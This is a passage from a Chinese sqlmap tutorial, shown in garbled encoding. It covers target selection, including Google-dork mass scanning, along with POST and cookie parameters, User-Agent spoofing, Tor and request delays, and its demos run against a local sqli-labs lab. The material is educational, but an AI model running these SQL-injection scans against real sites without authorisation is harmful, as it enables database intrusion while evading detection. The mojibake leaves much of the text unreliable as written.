href="https://cloud.tencent.com/developer?from_column=20421&from=20421">15.5 å…¶ä»–</a></li></ul></li><li><a href="https://cloud.tencent.com/developer?from_column=20421&from=20421">0x10 å¸¸ç”¨ Tamper è„šæœ¬</a></li></ul><h2 id="0x01-sqlmap-ç¡®å®šç›®æ ‡"><a href="#0x01-sqlmap-ç¡®å®šç›®æ ‡" class="headerlink" title="0x01 sqlmap ç¡®å®šç›®æ ‡"></a>0x01 sqlmap ç¡®å®šç›®æ ‡</h2><h3 id="1-1-ç›´è¿æ•°æ®åº“"><a href="#1-1-ç›´è¿æ•°æ®åº“" class="headerlink" title="1.1 ç›´è¿æ•°æ®åº“"></a>1.1 ç›´è¿æ•°æ®åº“</h3><p>sqlmapæ”¯æŒç›´æ¥è¿æ¥æ•°æ®åº“ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ç›´è¿</p><p>æœåŠ¡å‹æ•°æ®åº“ï¼ˆå‰æçŸ¥é“æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç ï¼‰ DBMS:&#x2F;&#x2F;USER:PASSWORD@DBMS_PORT&#x2F;DATABASE_NAME ï¼ˆMySQLï¼ŒOracleï¼ŒMicrosoft SQL Serverï¼ŒPostgreSQLï¼Œetcï¼‰</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -d â€œmysql:&#x2F;&#x2F;admin:<a href="mailto:&#x61;&#x64;&#109;&#x69;&#110;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#49;&#x2e;&#x32;">admin@192.168.1.2</a>:3306&#x2F;securityâ€ -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020546.png" alt="img"></p><p>æ–‡ä»¶å‹æ•°æ®åº“ï¼ˆå‰æçŸ¥é“æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ï¼‰ DBMS:&#x2F;&#x2F;DATABASE_FILEPATH (SQLiteï¼ŒMicrosoft Accessï¼ŒFire birdï¼Œetc)</p><h3 id="1-2-URLæ¢æµ‹"><a href="#1-2-URLæ¢æµ‹" class="headerlink" title="1.2 URLæ¢æµ‹"></a>1.2 URLæ¢æµ‹</h3><p>sqlmapç›´æ¥å¯¹å•ä¸€URLæ¢æµ‹ï¼Œä½¿ç”¨å‚æ•° -u æˆ– â€“url URLæ ¼å¼ï¼šhttp(s): &#x2F;&#x2F;targeturl [:port] &#x2F;[â€¦]</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u <a href="http://www.target/vuln.php?id=1">http://www.target/vuln.php?id=1</a> â€“banner</p><h3 id="1-3-æ–‡ä»¶è¯»å–ç›®æ ‡"><a href="#1-3-æ–‡ä»¶è¯»å–ç›®æ ‡" class="headerlink" title="1.3 æ–‡ä»¶è¯»å–ç›®æ ‡"></a>1.3 æ–‡ä»¶è¯»å–ç›®æ ‡</h3><p>sqlmapæ”¯æŒä»ä¸åŒç±»å‹çš„æ–‡ä»¶ä¸­è¯»å–ç›®æ ‡è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹ 1ã€-l ä»BurpSuite Proxyæˆ–ä»WebScarab Proxyä¸­è¯»å–HTTPè¯·æ±‚æ—¥å¿— </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020148.png" alt="img"></p><p> æŸ¥çœ‹burpsuiteæŠ“å–çš„æ—¥å¿—ä¿¡æ¯ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020092.png" alt="img"></p><p> ä½¿ç”¨sqlmapè¿›è¡Œæ¼”ç¤º </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021326.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020052.png" alt="img"></p><p>2ã€-x ä»sitemap.xmlç«™ç‚¹åœ°å›¾æ–‡ä»¶ä¸­è¯»å–ç›®æ ‡æ¢æµ‹</p><p>3ã€-m ä»å¤šè¡Œæ–‡æœ¬æ ¼å¼æ–‡ä»¶è¯»å–å¤šä¸ªç›®æ ‡</p><p>4ã€-r ä»æ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–HTTPè¯·æ±‚ä½œä¸ºSQLæ³¨å…¥æ¢æµ‹ç›®æ ‡ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021903.png" alt="img"></p><p> å°†burp suiteæŠ“å–çš„HTTPè¯·æ±‚ä¿¡æ¯ï¼Œå¤åˆ¶åˆ°txtæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨sqlmap -r â€˜txtæ–‡ä»¶â€™ è¿›è¡Œæ¢æµ‹</p><p>5ã€-c ä»é…ç½®æ–‡ä»¶ sqlmap.conf ä¸­è¯»å–ç›®æ ‡æ¢æµ‹ æŸ¥çœ‹sqlmap.conf æ–‡ä»¶çš„å†…å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021918.png" alt="img"></p><p> å°†æƒ³è¦æ¢æµ‹ç›®æ ‡çš„urlå¡«å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œé‡Œé¢ä¹Ÿå¯ä»¥é€šè¿‡æ—¥å¿—æ–‡ä»¶å½¢å¼ï¼ˆç›¸å½“äºä½¿ç”¨ -l å‚æ•°ï¼‰ã€HTTPè¯·æ±‚æ–‡ä»¶ï¼ˆç›¸å½“äºä½¿ç”¨ -r å‚æ•°ï¼‰è¿›è¡Œæ¢æµ‹ï¼Œè¿˜å¯ä»¥è®¾ç½®å…¶ä»–å‚æ•°ï¼Œä¾‹å¦‚ï¼šmethod(HTTPè¯·æ±‚æ–¹æ³•)ã€dataï¼ˆæŒ‡å®šPOSTæäº¤çš„æ•°æ®ï¼‰ç­‰ç­‰</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ç›®æ ‡urlå¡«å…¥sqlmap.confæ–‡ä»¶ï¼Œè¿›è¡Œæ¼”ç¤º python sqlmap.py -c sqlmap.conf â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020660.png" alt="img"></p><h3 id="1-4-Google-æ‰¹é‡æ‰«ææ³¨å…¥"><a href="#1-4-Google-æ‰¹é‡æ‰«ææ³¨å…¥" class="headerlink" title="1.4 Google æ‰¹é‡æ‰«ææ³¨å…¥"></a>1.4 Google æ‰¹é‡æ‰«ææ³¨å…¥</h3><p>sqlmapé€šè¿‡ -g è‡ªåŠ¨åˆ©ç”¨Googleè·å–æŒ‡å®šGoogle hackçš„ç›®æ ‡ï¼Œç„¶ååˆ©ç”¨äº¤äº’å‘å¯¼æ¨¡å¼è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -g â€œinurl:.php?id&#x3D;â€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020037.png" alt="img"></p><h2 id="0x02-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰"><a href="#0x02-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰" class="headerlink" title="0x02 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰"></a>0x02 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰</h2><h3 id="2-1-è®¾ç½®-HTTP-æ–¹æ³•"><a href="#2-1-è®¾ç½®-HTTP-æ–¹æ³•" class="headerlink" title="2.1 è®¾ç½® HTTP æ–¹æ³•"></a>2.1 è®¾ç½® HTTP æ–¹æ³•</h3><p>Sqlmapä¼šè‡ªåŠ¨åœ¨æ¢æµ‹è¿‡ç¨‹ä¸­ä½¿ç”¨é€‚åˆçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä½†æ˜¯åœ¨æŸäº›å…·ä½“æƒ…å†µä¸‹ï¼Œéœ€è¦å¼ºåˆ¶ä½¿ç”¨å…·ä½“çš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä¾‹å¦‚ PUTè¯·æ±‚æ–¹æ³•ã€‚HTTP PUTè¯·æ±‚æ–¹æ³•ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬å¼ºåˆ¶æŒ‡å®šã€‚ä½¿ç”¨ â€“method&#x3D;PUTã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021919.png" alt="img"></p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“method&#x3D;get â€“banner</p><h3 id="2-2-è®¾ç½®-POST-æäº¤å‚æ•°"><a href="#2-2-è®¾ç½®-POST-æäº¤å‚æ•°" class="headerlink" title="2.2 è®¾ç½® POST æäº¤å‚æ•°"></a>2.2 è®¾ç½® POST æäº¤å‚æ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç”¨äºæ‰§è¡ŒHTTPè¯·æ±‚çš„HTTPæ–¹æ³•æ˜¯GETï¼Œä½†æ˜¯æ‚¨å¯ä»¥é€šè¿‡æä¾›åœ¨POSTè¯·æ±‚ä¸­å‘é€çš„æ•°æ®éšå¼åœ°å°†å…¶æ›´æ”¹ä¸ºPOSTã€‚è¿™äº›æ•°æ®ä½œä¸ºè¿™äº›å‚æ•°ï¼Œè¢«ç”¨äºSQLæ³¨å…¥æ£€æµ‹ã€‚ ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.phpâ€</a> â€“data&#x3D;â€œid&#x3D;1â€ -f â€“banner â€“dbs â€“users</p><p>-f fingerprint æŒ‡çº¹</p><p>æ¼”ç¤ºï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;â€œuname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020309.png" alt="img"></p><h3 id="2-3-è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦"><a href="#2-3-è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦" class="headerlink" title="2.3 è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦"></a>2.3 è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œsqlmapéœ€è¦è¦†ç›–é»˜è®¤å‚æ•°åˆ†éš”ç¬¦(ä¾‹å¦‚&amp; in GETå’ŒPOSTæ•°æ®)ï¼Œæ‰èƒ½æ­£ç¡®åœ°åˆ†å‰²å’Œå•ç‹¬å¤„ç†æ¯ä¸ªå‚æ•°ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.phpâ€</a> â€“data&#x3D;â€œquery&#x3D;foobar;id&#x3D;1â€ â€“param-del&#x3D;â€;â€ -f â€“banner â€“dbs â€“users</p><p>æ¼”ç¤ºï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;uname&#x3D;â€œadmin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ â€“param-del&#x3D;â€&amp;â€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020662.png" alt="img"></p><h3 id="2-4-è®¾ç½®Cookie-å¤´"><a href="#2-4-è®¾ç½®Cookie-å¤´" class="headerlink" title="2.4 è®¾ç½®Cookie å¤´"></a>2.4 è®¾ç½®Cookie å¤´</h3><p>Sqlmapä¸­ç”¨æ¥è®¾ç½®Cookieçš„å‚æ•°ï¼šâ€“cookie, â€“cookie-del, â€“load-cookies â€“drop-set-cookie </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021972.png" alt="img"></p><p>ä½¿ç”¨åœºæ™¯ï¼š 1ã€Webåº”ç”¨ç¨‹åºå…·æœ‰åŸºäºCookieéªŒè¯çš„è¿‡ç¨‹ï¼› 2ã€æƒ³åˆ©ç”¨Cookieå€¼ä¸Šçš„SQLæ³¨å…¥æ¼æ´ã€‚</p><p>Sqlmapä½¿ç”¨Cookieè¿‡ç¨‹ï¼š 1ã€ç™»å½•æˆ–æµè§ˆé¡µé¢ã€‚ 2ã€æ‰“å¼€å®¡è®¡å·¥å…·æˆ–ä»£ç†æˆªæ–­ï¼Œå¤åˆ¶Cookieã€‚ 3ã€åœ¨Sqlmapä¸­ä½¿ç”¨ â€“cookie ç²˜è´´Cookieã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021255.png" alt="img"></p><p> python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;â€œuname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020973.png" alt="img"></p><p>å¦‚æœåœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œwebåº”ç”¨ç¨‹åºä½¿ç”¨Set-Cookieæ ‡å¤´è¿›è¡Œå“åº”ï¼Œsqlmapå°†åœ¨æ‰€æœ‰è¿›ä¸€æ­¥çš„HTTPè¯·æ±‚ä¸­è‡ªåŠ¨ä½¿ç”¨å…¶å€¼ä½œä¸ºCookieæ ‡å¤´ã€‚sqlmapè¿˜å°†ä¸ºSQLæ³¨å…¥è‡ªåŠ¨æµ‹è¯•è¿™äº›å€¼ã€‚è¿™å¯ä»¥é€šè¿‡æä¾›â€“drop-set-cookieâ€”sqlmapå°†å¿½ç•¥ä»»ä½•å³å°†åˆ°æ¥çš„Set-Cookieå¤´æ¥é¿å…ã€‚ åä¹‹äº¦ç„¶ï¼Œå¦‚æœæ‚¨æä¾›äº†ä¸€ä¸ªå¸¦æœ‰é€‰é¡¹çš„HTTP CookieæŠ¥å¤´â€”Cookieå’Œç›®æ ‡URLåœ¨ä»»ä½•æ—¶å€™å‘é€ä¸€ä¸ªHTTP set -CookieæŠ¥å¤´ï¼Œsqlmapå°†è¯¢é—®æ‚¨è¦ä¸ºä»¥ä¸‹HTTPè¯·æ±‚ä½¿ç”¨å“ªç»„Cookieã€‚</p><p>load-cookieï¼Œå¯ä»¥ç”¨æ¥æä¾›åŒ…å«Netscape&#x2F;wgetæ ¼å¼çš„cookieçš„ç‰¹æ®Šæ–‡ä»¶</p><p>æ³¨æ„ï¼šå¦‚æœéœ€è¦å¯¹HTTP Cookieå€¼è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹ï¼Œéœ€è¦è®¾ç½® â€“level 2ä»¥ä¸Šï¼ˆ3ï¼‰ã€‚</p><h3 id="2-5-è®¾ç½®-User-Agent-å¤´"><a href="#2-5-è®¾ç½®-User-Agent-å¤´" class="headerlink" title="2.5 è®¾ç½® User-Agent å¤´"></a>2.5 è®¾ç½® User-Agent å¤´</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ sqlmapä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·ä»£ç†å¤´å€¼æ‰§è¡ŒHTTPè¯·æ±‚: sqlmap&#x2F;1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>) ï¼ˆä½¿ç”¨Wireshark æŠ“åŒ…æŸ¥çœ‹ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020307.png" alt="img"></p><p> ç„¶è€Œï¼Œ é€šè¿‡æä¾›è‡ªå®šä¹‰ç”¨æˆ·ä»£ç†ä½œä¸ºé€‰é¡¹çš„å‚æ•°ï¼Œ å¯ä»¥ä½¿ç”¨é€‰é¡¹â€”user-agentæ¥ä¼ªé€ å®ƒã€‚ï¼ˆå¯ä½¿ç”¨burpsuiteæŠ“å–æ­£å¸¸çš„HTTPè¯·æ±‚åŒ…è·å–User-Agentå¤´çš„ä¿¡æ¯ï¼‰</p><p>sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“user-agent â€ Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0â€³ å†æ¬¡æŠ“åŒ…æŸ¥çœ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022685.png" alt="img"></p><p> æ­¤å¤–ï¼Œ é€šè¿‡ â€“random-agent, sqlmapå°†ä».&#x2F;txt&#x2F;user-agentä¸­éšæœºé€‰æ‹©ä¸€ä¸ªç”¨äºä¼šè¯ä¸­çš„æ‰€æœ‰HTTPè¯·æ±‚ã€‚ä¸€äº›ç«™ç‚¹åœ¨æœåŠ¡ç«¯æ£€æµ‹HTTP User-Agentå€¼ï¼Œ å¦‚æœä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„å€¼ï¼Œ å°±ä¼šä¸­æ–­è¿æ¥ã€‚ åŒæ—¶Sqlmapä¹Ÿä¼šæ›å‡ºé”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022826.png" alt="img"></p><p> æ¼”ç¤ºï¼š sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“random-agent æŠ“åŒ…æŸ¥çœ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020339.png" alt="img"></p><p>æ³¨æ„é’ˆå¯¹User-Agentçš„å€¼æ¢æµ‹SQLæ³¨å…¥ï¼Œ éœ€è¦è®¾ç½®â€“level å€¼ä¸º3ã€‚æˆ–è€…ï¼Œä½¿ç”¨Burp SuiteæŠ“åŒ…ï¼Œå°†HTTPè¯·æ±‚ä¿¡æ¯å¤åˆ¶åˆ°txtæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨è¦User-Agentå¤´çš„åé¢åŠ ä¸Šä¸€ä¸ª * å·ï¼Œè¿™æ ·ä¸ä½¿ç”¨â€”level 3 ä¹Ÿèƒ½å¤Ÿå¯¹User-Agentå¤´è¿›è¡Œæ¢æµ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022473.png" alt="img"></p><h3 id="2-6-è®¾ç½®-Host-å¤´"><a href="#2-6-è®¾ç½®-Host-å¤´" class="headerlink" title="2.6 è®¾ç½® Host å¤´"></a>2.6 è®¾ç½® Host å¤´</h3><p>å¯ä»¥æ‰‹åŠ¨è®¾ç½®HTTPä¸»æœºå¤´å€¼ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ ä»æä¾›çš„ç›®æ ‡URLè§£æHTTPä¸»æœºå¤´ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020559.png" alt="img"></p><p> æ³¨æ„ï¼Œ å¦‚æœ â€“levelè®¾ç½®ä¸º5,å°†å¯¹HTTPä¸»æœºå¤´è¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ã€‚</p><h3 id="2-7-è®¾ç½®-Referer-å¤´"><a href="#2-7-è®¾ç½®-Referer-å¤´" class="headerlink" title="2.7 è®¾ç½® Referer å¤´"></a>2.7 è®¾ç½® Referer å¤´</h3><p>ä¼ªé€ HTTP Refererå€¼æ˜¯å¯èƒ½çš„ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ å¦‚æœæ²¡æœ‰æ˜¾å¼è®¾ç½®ï¼Œ HTTPè¯·æ±‚ä¸­ä¸ä¼šå‘é€HTTPå¼•ç”¨å¤´ã€‚ è¯·æ³¨æ„ï¼Œ å¦‚æœâ€“levelè®¾ç½®ä¸º3æˆ–ä»¥ä¸Šï¼Œ å°†é’ˆå¯¹HTTPå¼•ç”¨å¤´ è¿›è¡ŒSQLæ³¨å…¥æµ‹è¯•ï¼ˆæˆ–åœ¨è¯·æ±‚ä¿¡æ¯ä¸­è¦è¿›è¡Œæ¢æµ‹çš„ä½ç½®åé¢åŠ ä¸Š*å·ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020440.png" alt="img"></p><h3 id="2-8-è®¾ç½®-é¢å¤–-HTTP-å¤´"><a href="#2-8-è®¾ç½®-é¢å¤–-HTTP-å¤´" class="headerlink" title="2.8 è®¾ç½® é¢å¤– HTTP å¤´"></a>2.8 è®¾ç½® é¢å¤– HTTP å¤´</h3><p>é€šè¿‡è®¾ç½®é€‰é¡¹â€“headerï¼Œ å¯ä»¥æä¾›é¢å¤–çš„HTTPæ ‡å¤´ã€‚ æ¯ä¸ªæ ‡å¤´å¿…é¡»ç”¨æ¢è¡Œç¬¦ï¼ˆ\nï¼‰åˆ†éš”ï¼Œ ä»é…ç½®INIæ–‡ä»¶ä¸­æä¾›å®ƒä»¬è¦å®¹æ˜“å¾—å¤šã€‚ å¯ä»¥æŸ¥çœ‹ç¤ºä¾‹sqlmap.confæ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1â€</a> â€“headers&#x3D;â€œHost:<a href="http://www.target.com/nUser-agent:Firefox">www.target.com\nUser-agent:Firefox</a> 1.0â€ -v 5</p><p>ä»¥Sqli-Labsé¶åœºçš„Sqli-Less1ä¸ºä¾‹ å°†User-Agentè®¾ä¸ºï¼šhaha å°†cookieè®¾ä¸º:heihei</p><p>sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“headers&#x3D;â€œuser-agent:haha\ncookie:heiheiâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020619.png" alt="img"></p><h3 id="2-9-è®¾ç½®-HTTP-åè®®è®¤è¯"><a href="#2-9-è®¾ç½®-HTTP-åè®®è®¤è¯" class="headerlink" title="2.9 è®¾ç½® HTTP åè®®è®¤è¯"></a>2.9 è®¾ç½® HTTP åè®®è®¤è¯</h3><p>Sqlmapä¸­è®¾ç½®HTTPåè®®è®¤è¯çš„å‚æ•°ï¼š â€“auth-typeå’Œâ€“auth-cred</p><p>å…¶ä¸­â€“auth-typeæ”¯æŒ Basicã€ Digestã€ NTLM</p><p>â€“auth-credè®¤è¯è¯­æ³•ä¸ºï¼š username:password ï¼ˆç”¨äºéœ€è¦è´¦å·å¯†ç ç™»å½•çš„é¡µé¢ï¼‰</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://url/arit.php?id=1%E2%80%9D">http://url/arit.php?id=1â€</a> â€“auth-type Basic â€“auth-cred â€œtestuser:testpassâ€</p><h3 id="2-10-è®¾ç½®-HTTP-ä»£ç†"><a href="#2-10-è®¾ç½®-HTTP-ä»£ç†" class="headerlink" title="2.10 è®¾ç½® HTTP ä»£ç†"></a>2.10 è®¾ç½® HTTP ä»£ç†</h3><p>Sqlmapä¸­è®¾ç½®ä»£ç†çš„å‚æ•°ï¼š â€“proxy, â€“proxy-cred, â€“proxy-file ï¼Œ â€“ignore-proxy</p><p>å…¶ä¸­â€“proxyç”¨æ¥è®¾ç½®HTTPä»£ç†æœåŠ¡å™¨ä½ç½® æ ¼å¼ï¼š â€“proxy http(s): &#x2F;&#x2F;ip[:ç«¯å£]</p><p>â€“proxy-credç”¨æ¥è®¾ç½®HTTPä»£ç†æœåŠ¡å™¨è®¤è¯ä¿¡æ¯ æ ¼å¼ï¼š â€“proxy-cred username:password</p><p>â€“proxy-fileç”¨æ¥è®¾ç½®å¤šæ¡ä»£ç†åœ¨æ–‡ä»¶ä¸­</p><p>â€“ignore-proxyå½“æ‚¨å¸Œæœ›é€šè¿‡å¿½ç•¥ç³»ç»ŸèŒƒå›´å†…çš„HTTP(S)ä»£ç†æœåŠ¡å™¨è®¾ç½®æ¥é’ˆå¯¹æœ¬åœ°ç½‘ç»œçš„ç›®æ ‡éƒ¨åˆ†è¿è¡Œsqlmapæ—¶ï¼Œ åº”è¯¥ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚</p><h2 id="0x03-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰"><a href="#0x03-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰" class="headerlink" title="0x03 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰"></a>0x03 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰</h2><h3 id="3-1-è®¾ç½®Toréšè—ç½‘ç»œ"><a href="#3-1-è®¾ç½®Toréšè—ç½‘ç»œ" class="headerlink" title="3.1 è®¾ç½®Toréšè—ç½‘ç»œ"></a>3.1 è®¾ç½®Toréšè—ç½‘ç»œ</h3><p>Sqlmapä¸­è®¾ç½®Torç½‘ç»œçš„å‚æ•°ï¼š â€“tor â€“tor-port â€“tor-typeï¼ˆå…±æœ‰å››ç§ç±»å‹ï¼šHTTPã€HTTPSã€SOCKS4ã€SOCKS5ï¼‰ â€“check-tor</p><h3 id="3-2-è®¾ç½®å»¶æ—¶"><a href="#3-2-è®¾ç½®å»¶æ—¶" class="headerlink" title="3.2 è®¾ç½®å»¶æ—¶"></a>3.2 è®¾ç½®å»¶æ—¶</h3><p>Sqlmapæ¢æµ‹è¿‡ç¨‹ä¸­ä¼šå‘é€å¤§é‡æ¢æµ‹Payloadåˆ°ç›®æ ‡ï¼Œ å¦‚æœé»˜è®¤æƒ…å†µè¿‡å¿«çš„å‘åŒ…é€Ÿåº¦å›å¯¼è‡´ç›®æ ‡é¢„è­¦æˆ–æ–­å¼€è¿æ¥ã€‚ ä¸ºäº†é¿å…è¿™æ ·çš„æƒ…å†µå‘ç”Ÿï¼Œ å¯ä»¥åœ¨æ¢æµ‹è®¾ç½®Sqlm1apå‘åŒ…å»¶è¿Ÿã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ ä¸è®¾ç½®å»¶è¿Ÿã€‚ â€“delay 0.5 è®¾ç½®å»¶è¿Ÿ0.5ç§’</p><h3 id="3-3-è®¾ç½®è¶…æ—¶"><a href="#3-3-è®¾ç½®è¶…æ—¶" class="headerlink" title="3.3 è®¾ç½®è¶…æ—¶"></a>3.3 è®¾ç½®è¶…æ—¶</h3><p>åœ¨è€ƒè™‘è¶…æ—¶HTTP(S)è¯·æ±‚ä¹‹å‰ï¼Œ å¯ä»¥æŒ‡å®šç­‰å¾…çš„ç§’æ•°ã€‚ æœ‰æ•ˆå€¼æ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œ ä¾‹å¦‚10.5è¡¨ç¤º10ç§’åŠã€‚ é»˜è®¤è®¾ç½®ä¸º30ç§’ã€‚ ä¾‹å¦‚ï¼š â€“timeout 10.5</p><h3 id="3-4-è®¾ç½®é‡ä¼ æ¬¡æ•°"><a href="#3-4-è®¾ç½®é‡ä¼ æ¬¡æ•°" class="headerlink" title="3.4 è®¾ç½®é‡ä¼ æ¬¡æ•°"></a>3.4 è®¾ç½®é‡ä¼ æ¬¡æ•°</h3><p>â€“retries count è®¾ç½®å¯¹åº”é‡è¯•æ¬¡æ•°ï¼Œ é»˜è®¤æƒ…å†µä¸‹é‡è¯•3æ¬¡ã€‚ï¼ˆé€šå¸¸ä¸è¶…æ—¶å‚æ•°ç»“åˆä½¿ç”¨ï¼‰</p><h3 id="3-5-è®¾ç½®éšæœºåŒ–å‚æ•°"><a href="#3-5-è®¾ç½®éšæœºåŒ–å‚æ•°" class="headerlink" title="3.5 è®¾ç½®éšæœºåŒ–å‚æ•°"></a>3.5 è®¾ç½®éšæœºåŒ–å‚æ•°</h3><p>Sqlmapå¯ä»¥æŒ‡å®šè¦åœ¨æ¯æ¬¡è¯·æ±‚æœŸé—´éšæœºæ›´æ”¹å…¶å€¼çš„å‚æ•°åç§°ã€‚ é•¿åº¦å’Œç±»å‹æ ¹æ®æä¾›çš„åŸå§‹å€¼ä¿æŒä¸€ç›´ã€‚ â€“randomize å‚æ•°åç§°</p><p>ä¾‹å¦‚ï¼š </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020284.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020240.png" alt="img"></p><h3 id="3-6-è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡"><a href="#3-6-è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡" class="headerlink" title="3.6 è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡"></a>3.6 